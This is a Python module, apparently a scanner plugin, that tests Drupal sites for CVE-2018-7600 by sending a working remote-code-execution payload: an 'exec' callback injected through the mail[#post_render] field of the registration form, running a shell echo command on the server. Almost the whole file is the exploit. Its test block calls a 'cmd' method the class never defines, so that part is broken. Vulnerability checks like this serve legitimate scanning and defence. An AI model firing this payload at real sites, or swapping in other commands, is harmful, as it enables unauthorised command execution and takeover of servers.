#!/usr/bin/env python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2018_7600_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-7600',
            'description': 'Drupal Remote Code Execution Vulnerability, 受影响范围: Drupal 7.58之前的所有7.x版本,8.3.9之前的所有8.3.x版本,8.4.6之前的所有8.4.x版本,8.5.1之前的所有8.5.x版本',
            'date': '2018-03-28',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.payload_url = self.url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
        self.headers = {
            'User-Agent': get_useragent()
        }
        self.capta = get_capta()
        self.payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '%s'}

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            self.payload['mail[#markup]'] = '%s'
            self.payload['mail[#markup]'] = self.payload['mail[#markup]'] %('echo ' + self.capta + 'win^dowslin$1ux')
            check_req = await request.post(self.payload_url, headers = self.headers, data = self.payload)
            if self.capta in await check_req.text() and ('windows' in await check_req.text() or 'linux' in await check_req.text()):
                if 'windows' in await check_req.text():
                    self.osname = 'Windows'
                elif 'linux' in await check_req.text():
                    self.osname = 'Linux'
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2018_7600 = CVE_2018_7600_BaseVerify('http://127.0.0.1:8080')
    print(CVE_2018_7600.cmd('id'))
    


